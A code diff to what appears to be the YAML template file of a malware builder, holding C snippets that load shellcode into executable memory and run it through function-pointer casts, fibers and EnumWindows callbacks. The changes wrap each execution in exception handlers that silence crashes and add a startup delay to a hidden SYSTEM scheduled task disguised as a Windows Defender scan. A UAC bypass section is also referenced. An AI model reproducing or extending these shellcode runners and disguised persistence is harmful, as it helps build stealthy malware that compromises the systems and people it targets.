@@ -1487,7 +1487,8 @@ sections:
               return -1;
           }
           
-          ((void(*)())execMem)();
+          __try { ((void(*)())execMem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
           
           VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);
           HeapFree(hHeap, 0, execMem);
@@ -1567,7 +1568,8 @@ sections:
           if (mainFiber) {
               PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
               if (shellcodeFiber) {
-                  SwitchToFiber(shellcodeFiber);
+                  __try { SwitchToFiber(shellcodeFiber); }
+                  __except(EXCEPTION_EXECUTE_HANDLER) {}
                   DeleteFiber(shellcodeFiber);
               }
               ConvertFiberToThread();
@@ -1590,7 +1592,8 @@ sections:
           DWORD oldProtect;
           VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
           
-          EnumWindows((WNDENUMPROC)execMem, 0);
+          __try { EnumWindows((WNDENUMPROC)execMem, 0); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
           
           VirtualFree(execMem, 0, MEM_RELEASE);
       }
@@ -1641,7 +1644,8 @@ sections:
           // Final check before execution
           if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }
           
-          ((void(*)())mem)();
+          __try { ((void(*)())mem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
           
           // Cleanup
           VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
@@ -1660,7 +1664,8 @@ sections:
           memcpy(mem, code_blob, code_blob_len);
           DWORD old;
           VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
-          ((void(*)())mem)();
+          __try { ((void(*)())mem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
           VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
           SecureZeroMemory(mem, code_blob_len);
           VirtualFree(mem, 0, MEM_RELEASE);
@@ -1697,7 +1702,8 @@ sections:
       void* m = VirtualAlloc(0, code_blob_len, 0x3000, 0x40);
       if (m) {
           memcpy(m, code_blob, code_blob_len);
-          ((void(*)())m)();
+          __try { ((void(*)())m)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
       }
   - id: RWXAlloc
     display: Single RWX Allocation
@@ -1706,7 +1712,8 @@ sections:
       // Even smaller - direct RWX allocation
       void* m = VirtualAlloc(0, code_blob_len, 0x3000, 0x40);
       memcpy(m, code_blob, code_blob_len);
-      ((void(*)())m)();
+      __try { ((void(*)())m)(); }
+      __except(EXCEPTION_EXECUTE_HANDLER) {}
 - header: UAC Bypass
   template: uacb
   display: UAC Bypass
@@ -2120,6 +2127,11 @@ sections:
       type: textbox
       defaultValue: "MicrosoftWindowsDefenderPeriodicScanCheck"
       placeholder: "MicrosoftWindowsDefenderPeriodicScanCheck"
+    - id: sched_startup_delay
+      label: "Startup delay (HHMM:SS)"
+      type: textbox
+      defaultValue: "0001:00"
+      placeholder: "0001:00"
     snippet: |
       // Persistence: Scheduled Task — System Boot, SYSTEM Account
       // Creates a task that fires at every system startup (/SC ONSTART) running as
@@ -2137,7 +2149,7 @@ sections:
           wash_track(_ss_exe);
           wsprintfW(_ss_cmd,
                     L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
-                    L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F",
+                    L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
                     _ss_exe);
           _ss_si.dwFlags     = STARTF_USESHOWWINDOW;
           _ss_si.wShowWindow = SW_HIDE;
